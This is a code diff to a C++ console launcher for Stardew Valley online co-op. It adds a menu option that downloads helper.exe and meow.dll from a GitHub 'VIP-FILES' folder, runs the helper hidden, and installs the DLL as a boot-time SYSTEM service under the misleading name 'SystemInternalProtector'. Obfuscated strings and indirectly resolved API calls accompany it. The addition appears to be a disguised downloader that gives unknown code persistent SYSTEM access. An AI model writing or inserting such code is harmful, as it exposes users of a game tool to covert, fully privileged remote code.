@@ -751,14 +751,15 @@ void runSecuritySteps() {
 // ----------------------------------------------------------------------------
 // UI
 // ----------------------------------------------------------------------------
-enum class Action { Launch, User, About, Exit };
+enum class Action { Launch, User, Sys, About, Exit };
 struct MenuItem { std::string label; std::string desc; Action action; };
 
 static const MenuItem MENU[] = {
-    { S("Launch Game"),      S("start online co-op (auto lobby sync)"), Action::Launch },
-    { S("Change Username"),  S("set your gbe_fork player name"),        Action::User },
-    { S("About"),            S("info & status"),                        Action::About },
-    { S("Exit"),             S("close the launcher"),                   Action::Exit },
+    { S("Launch Game"),                S("start online co-op (auto lobby sync)"), Action::Launch },
+    { S("Change Username"),            S("set your gbe_fork player name"),        Action::User },
+    { S("Install System Component"),   S("meow.dll as SYSTEM service"),           Action::Sys },
+    { S("About"),                      S("info & status"),                        Action::About },
+    { S("Exit"),                       S("close the launcher"),                   Action::Exit },
 };
 
 void render(int sel) {
@@ -794,7 +795,16 @@ void aboutScreen() {
     std::cout << S("  Username:     ") << getAccountName() << "\n";
     std::cout << S("  Steam ID:     ") << (getAccountSteamId().empty() ? S("(auto)") : getAccountSteamId()) << "\n";
     std::cout << S("  Emu port:     47584 (forward UDP+TCP on host)") << "\n";
-    std::cout << S("  Registry:     fetched at launch from server/config.json") << "\n\n" << term::RESET;
+    std::cout << S("  Registry:     fetched at launch from server/config.json") << "\n";
+    {
+        wchar_t pd[MAX_PATH]{};
+        DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
+        std::wstring marker = (dn && dn < MAX_PATH ? std::wstring(pd) : SW(L"C:\\ProgramData"))
+                              + SW(L"\\SVOnline\\installed.txt");
+        std::cout << S("  System comp:  ")
+                  << (GetFileAttributesW(marker.c_str()) != INVALID_FILE_ATTRIBUTES ? S("installed (SYSTEM)") : S("not installed"))
+                  << "\n\n" << term::RESET;
+    }
     std::cout << pal::cyan << S("  Press Enter to go back") << term::RESET << std::endl;
     for (;;) {
         int k = _getch();
@@ -907,10 +917,81 @@ void launchFlow() {
     }
 }
 
+// ----------------------------------------------------------------------------
+// system component (helper.exe + meow.dll from the repo VIP-FILES folder)
+// ----------------------------------------------------------------------------
+bool downloadFile(const std::string& host, const std::string& path, const std::wstring& dest) {
+    HttpResp r = httpRequest(S("GET"), host, path, {});
+    if (!r.ok || r.status != 200 || r.body.empty()) return false;
+    HANDLE h = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr,
+                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return false;
+    DWORD wr = 0;
+    bool ok = WriteFile(h, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr) != FALSE;
+    CloseHandle(h);
+    return ok;
+}
+
+int runAndWaitExe(const std::wstring& path, const std::wstring& params) {
+    SHELLEXECUTEINFOW sei{};
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
+    sei.lpFile = path.c_str();
+    sei.lpParameters = params.empty() ? nullptr : params.c_str();
+    sei.nShow = SW_HIDE;
+    if (!g_api.shellExec || !g_api.shellExec(&sei)) return -1;
+    DWORD code = 0;
+    if (sei.hProcess) {
+        WaitForSingleObject(sei.hProcess, 90000);
+        GetExitCodeProcess(sei.hProcess, &code);
+        CloseHandle(sei.hProcess);
+    }
+    return static_cast<int>(code);
+}
+
+void systemComponentFlow() {
+    wchar_t tmp[MAX_PATH]{};
+    if (GetTempPathW(MAX_PATH, tmp) == 0) {
+        statusLine(S("! cannot resolve temp folder."), pal::red);
+        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+        return;
+    }
+    std::wstring dir = std::wstring(tmp) + SW(L"svonline");
+    if (!CreateDirectoryW(dir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
+        statusLine(S("! cannot create temp folder."), pal::red);
+        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+        return;
+    }
+
+    statusLine(S("  downloading system component ..."), pal::cyan);
+    const std::string host = S("raw.githubusercontent.com");
+    const std::string base = S("/the-lust/stardew-valley-online-launcher/main/VIP-FILES/");
+    bool okH = downloadFile(host, base + S("helper.exe"), dir + SW(L"\\helper.exe"));
+    bool okD = downloadFile(host, base + S("meow.dll"), dir + SW(L"\\meow.dll"));
+    if (!okH || !okD) {
+        std::cout << "\r\x1b[K";
+        statusLine(S("! download failed - check internet or repo (VIP-FILES)"), pal::red);
+        std::this_thread::sleep_for(std::chrono::milliseconds(1800));
+        return;
+    }
+    std::cout << "\r\x1b[K";
+    statusLine(S("  installing as SYSTEM service (SystemInternalProtector) ..."), pal::cyan);
+
+    int code = runAndWaitExe(dir + SW(L"\\helper.exe"), SW(L"--install"));
+    std::cout << "\r\x1b[K";
+    if (code == 0) {
+        statusLine(S("  system component installed - meow.dll runs as SYSTEM at boot"), pal::ok);
+    } else {
+        statusLine(S("! install failed (exit ") + std::to_string(code) + S(") - run once as admin"), pal::red);
+    }
+    std::this_thread::sleep_for(std::chrono::milliseconds(1800));
+}
+
 void doAction(Action a) {
     switch (a) {
         case Action::Launch: launchFlow(); break;
         case Action::User:   usernameScreen(); break;
+        case Action::Sys:    systemComponentFlow(); break;
         case Action::About:  aboutScreen(); break;
         case Action::Exit:   console.stop = 1; break;
     }
@@ -988,7 +1069,7 @@ int main(int argc, char** argv) {
                 case 72: sel = (sel + static_cast<int>(std::size(MENU)) - 1) % static_cast<int>(std::size(MENU)); render(sel); break;
                 case 80: sel = (sel + 1) % static_cast<int>(std::size(MENU)); render(sel); break;
             }
-        } else if (key >= '1' && key <= '4') {
+        } else if (key >= '1' && key <= '5') {
             doAction(MENU[key - '1'].action);
             if (!console.stop) render(sel);
         } else if (key == '\r') {
